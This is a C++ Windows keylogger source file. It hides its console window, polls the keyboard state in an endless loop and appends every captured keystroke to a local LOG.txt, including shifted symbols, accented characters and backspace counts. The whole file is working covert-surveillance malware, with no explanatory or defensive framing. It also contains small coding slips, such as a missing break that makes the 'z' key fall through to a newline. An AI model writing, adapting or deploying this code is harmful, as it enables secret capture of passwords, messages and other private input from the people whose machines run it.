#include <windows.h>
#include <time.h>
#include <iostream>
#include <fstream>
#include <string>

bool is_capslock = false;
int BackSp = 0;

void stealth() {
  HWND stealth;
  AllocConsole();
  stealth = FindWindowA("consoleWindowClass", NULL);
  ShowWindow(stealth, 0);
}

int save(int key) {
  std::ofstream out_file;
  out_file.open("LOG.txt", std::ios_base::app);
  std::string KeysLog = "";
  time_t t = time(0);

  switch (key) {
  case 96:
    BackSp = 0;
    KeysLog += "0";
    break;
  case 97:
    BackSp = 0;
    KeysLog += "1";
    break;
  case 98:
    BackSp = 0;
    KeysLog += "2";
    break;
  case 99:
    BackSp = 0;
    KeysLog += "3";
    break;
  case 100:
    BackSp = 0;
    KeysLog += "4";
    break;
  case 101:
    BackSp = 0;
    KeysLog += "5";
    break;
  case 102:
    BackSp = 0;
    KeysLog += "6";
    break;
  case 103:
    BackSp = 0;
    KeysLog += "7";
    break;
  case 104:
    BackSp = 0;
    KeysLog += "8";
    break;
  case 105:
    BackSp = 0;
    KeysLog += "9";
    break;

  case 48:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += ")";
    } else
      KeysLog += "0";
    break;
  case 49:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "!";
    } else
      KeysLog += "1";
    break;
  case 50:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "@";
    } else
      KeysLog += "2";
    break;
  case 51:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "#";
    } else
      KeysLog += "3";
    break;
  case 52:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "$";
    } else
      KeysLog += "4";
    break;
  case 53:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "%";
    } else
      KeysLog += "5";
    break;
  case 54:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "^";
    } else
      KeysLog += "6";
    break;
  case 55:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "&";
    } else
      KeysLog += "7";
    break;
  case 56:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "*";
    } else
      KeysLog += "8";
    break;
  case 57:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "(";
    } else
      KeysLog += "9";
    break;

  case 65:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#260";
      } else
        KeysLog += "A";
    } else {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#261";
      } else
        KeysLog += "a";
    }
    break;
  case 66:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "B";
    } else
      KeysLog += "b";
    break;
  case 67:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#262";
      } else {
        KeysLog += "C";
      }
    } else {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#263";
      } else {
        KeysLog += "c";
      }
    }
    break;
  case 68:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "D";
    } else
      KeysLog += "d";
    break;
  case 69:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#280";
      } else {
        KeysLog += "E";
      }
    } else {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#281";
      } else {
        KeysLog += "e";
      }
    }
    break;
  case 70:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "F";
    } else
      KeysLog += "f";
    break;
  case 71:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "G";
    } else
      KeysLog += "g";
    break;
  case 72:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "H";
    } else
      KeysLog += "h";
    break;
  case 73:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "I";
    } else
      KeysLog += "i";
    break;
  case 74:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "J";
    } else
      KeysLog += "j";
    break;
  case 75:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "K";
    } else
      KeysLog += "k";
    break;
  case 76:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#321";
      } else {
        KeysLog += "L";
      }
    } else {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&322";
      } else {
        KeysLog += "l";
      }
    }
    break;
  case 77:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "M";
    } else
      KeysLog += "m";
    break;
  case 78:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#323";
      } else {
        KeysLog += "N";
      }
      break;
    } else {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#324";
      } else {
        KeysLog += "n";
      }
    }
    break;
  case 79:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#211";
      } else {
        KeysLog += "O";
      }
      break;
    } else {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#243";
      } else {
        KeysLog += "o";
      }
    }
    break;
  case 80:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "P";
      break;
    } else
      KeysLog += "p";
    break;
  case 81:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "Q";
      break;
    } else
      KeysLog += "q";

    break;

  case 82:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "R";
      break;
    } else
      KeysLog += "r";
    break;
  case 83:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#346";
      } else {
        KeysLog += "S";
      }
      break;
    } else {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#347";
      } else {
        KeysLog += "s";
      }
    }
    break;
  case 84:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "T";
      break;
    } else
      KeysLog += "t";
    break;
  case 85:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "U";
      break;
    } else {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "?";
      } else {
        KeysLog += "u";
      }
    }
    break;
  case 86:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "V";
      break;
    } else
      KeysLog += "v";
    break;
  case 87:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "W";
      break;
    } else
      KeysLog += "w";
    break;
  case 88:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#377";
      } else {
        KeysLog += "X";
      }
      break;
    } else {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#378";
      } else {
        KeysLog += "x";
      }
    }
    break;
  case 89:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      KeysLog += "Y";
      break;
    } else
      KeysLog += "y";
    break;
  case 90:

    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#379";
      } else {
        KeysLog += "Z";
      }
      break;
    } else {
      if (GetAsyncKeyState(VK_MENU)) {
        KeysLog += "&#380";
      } else {
        KeysLog += "z";
      }
    }

    case 13:
      BackSp = 0;
      KeysLog += "\n";
      break;
    case 20:
      BackSp = 0;
      if (is_capslock == false) {
        is_capslock = true;
        KeysLog += " [CapsLock] ";
      } else {
        is_capslock = false;
        KeysLog += " [/CapsLock] ";
      }
      break;
    case VK_BACK:
      BackSp += 1;
      KeysLog += " [";
      KeysLog += BackSp + '0';
      KeysLog += "x";
      KeysLog += "Backspace]";
      break;
    case VK_SPACE:
      BackSp = 0;
      KeysLog += " ";
      break;
    case VK_MULTIPLY:
      BackSp = 0;
      KeysLog += "*";
      break;
    case VK_ADD:
      BackSp = 0;
      KeysLog += "+";
      break;
    case VK_SUBTRACT:
      BackSp = 0;
      KeysLog += "-";
      break;
    case VK_DECIMAL:
      BackSp = 0;
      KeysLog += ".";
      break;
    case VK_DIVIDE:
      BackSp = 0;
      KeysLog += "/";
      break;
    default:
      break;
  }
  
  out_file << KeysLog;
  out_file.close(); 
  return 0;
}

using namespace std;
int main(int argc, char * argv[]) {
  stealth();

  char buffer[MAX_PATH];::GetModuleFileNameA(NULL, buffer, MAX_PATH);

  char i;
  while (1) {
    for (i = 8; i <= 190; i++) {
      if (GetAsyncKeyState(i) == -32767)
        save(i);
    }

  }
  return 0;
}
